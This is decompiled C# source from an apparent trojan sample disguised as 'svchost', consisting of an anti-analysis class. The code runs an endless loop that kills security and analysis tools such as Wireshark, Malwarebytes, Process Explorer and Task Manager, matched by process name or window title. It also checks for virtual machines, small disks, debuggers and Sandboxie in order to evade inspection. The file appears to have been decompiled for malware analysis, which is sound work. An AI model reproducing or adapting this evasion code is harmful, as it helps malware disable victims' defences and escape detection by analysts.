// Decompiled with JetBrains decompiler
// Type: svchost.Antis.Anti_Debugging
// Assembly: svchost, Version=10.0.18362.1, Culture=neutral, PublicKeyToken=null
// MVID: 64EF29CB-BBE3-43C5-8FBF-9660E67757C5
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.Win32.Generic-b33d569af5e490875d6473c6402797ddb4ce639bb1f1cf7f67698eeafa625f09.exe

using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using System;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Threading;

namespace svchost.Antis
{
  [OptionText]
  public class Anti_Debugging
  {
    public object Start()
    {
      new Thread((ParameterizedThreadStart) (a0 => this.Bypass(Conversions.ToBoolean(a0))))
      {
        IsBackground = true
      }.Start((object) true);
      return Anti_Debugging.IsSmallDisk() || Anti_Debugging.IsXP() || Anti_Debugging.DetectManufacturer() || Anti_Debugging.DetectDebugger() || Anti_Debugging.DetectSandboxie() ? (object) false : (object) true;
    }

    public object Bypass(bool x)
    {
      string[] strArray1 = new string[25]
      {
        "procexp",
        "SbieCtrl",
        "SpyTheSpy",
        "SpeedGear",
        "wireshark",
        "mbam",
        "apateDNS",
        "IPBlocker",
        "cports",
        "ProcessHacker",
        "KeyScrambler",
        "Tcpview",
        "smsniff",
        "exeinfoPE",
        "regshot",
        "RogueKiller",
        "NetSnifferCs",
        "taskmgr",
        "Reflector",
        "capsa",
        "NetworkMiner",
        "AdvancedProcessController",
        "ProcessLassoLauncher",
        "ProcessLasso",
        "SystemExplorer"
      };
      string[] strArray2 = new string[18]
      {
        "ApateDNS",
        "Malwarebytes Anti-Malware",
        "Malwarebytes Anti-Malware",
        "TCPEye",
        "SmartSniff",
        "Active Ports",
        "ProcessEye",
        "MKN TaskExplorer",
        "CurrPorts",
        "System Explorer",
        "DiamondCS Port Explorer",
        "VirusTotal",
        "Metascan Online",
        "Speed Gear",
        "The Wireshark Network Analyzer",
        "Sandboxie Control",
        "ApateDNS",
        ".NET Reflector"
      };
      object message;
      try
      {
        while (x)
        {
          string[] strArray3 = strArray1;
          int index1 = 0;
          while (index1 < strArray3.Length)
          {
            Process[] processesByName = Process.GetProcessesByName(strArray3[index1]);
            int index2 = 0;
            while (index2 < processesByName.Length)
            {
              processesByName[index2].Kill();
              checked { ++index2; }
            }
            checked { ++index1; }
          }
          string[] strArray4 = strArray2;
          int index3 = 0;
          while (index3 < strArray4.Length)
          {
            string str = strArray4[index3];
            Process[] processes = Process.GetProcesses();
            int index4 = 0;
            while (index4 < processes.Length)
            {
              Process process = processes[index4];
              if (process.MainWindowTitle.Contains(str))
                process.Kill();
              checked { ++index4; }
            }
            checked { ++index3; }
          }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        message = (object) ex.Message;
        ProjectData.ClearProjectError();
        goto label_19;
      }
      return (object) "";
label_19:
      return message;
    }

    private static bool IsSmallDisk()
    {
      try
      {
        long num = 61000000000;
        if (new DriveInfo(Path.GetPathRoot(Environment.SystemDirectory)).TotalSize <= num)
          return true;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      return false;
    }

    private static bool IsXP()
    {
      try
      {
        if (new ComputerInfo().OSFullName.ToLower().Contains("xp"))
          return true;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      return false;
    }

    private static bool DetectManufacturer()
    {
      try
      {
        using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
        {
          using (ManagementObjectCollection objectCollection = managementObjectSearcher.Get())
          {
            try
            {
              foreach (ManagementBaseObject managementBaseObject in objectCollection)
              {
                string lower = managementBaseObject["Manufacturer"].ToString().ToLower();
                if (Operators.CompareString(lower, "microsoft corporation", true) == 0 && managementBaseObject["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL") || lower.Contains("vmware") || Operators.CompareString(managementBaseObject["Model"].ToString(), "VirtualBox", true) == 0)
                  return true;
              }
            }
            finally
            {
              ManagementObjectCollection.ManagementObjectEnumerator objectEnumerator;
              objectEnumerator?.Dispose();
            }
          }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      return false;
    }

    private static bool DetectDebugger()
    {
      bool isDebuggerPresent = false;
      bool flag;
      try
      {
        NativeMethods.CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, ref isDebuggerPresent);
        flag = isDebuggerPresent;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        flag = isDebuggerPresent;
        ProjectData.ClearProjectError();
      }
      return flag;
    }

    private static bool DetectSandboxie()
    {
      bool flag;
      try
      {
        flag = NativeMethods.GetModuleHandle("SbieDll.dll").ToInt32() != 0;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        flag = false;
        ProjectData.ClearProjectError();
      }
      return flag;
    }
  }
}
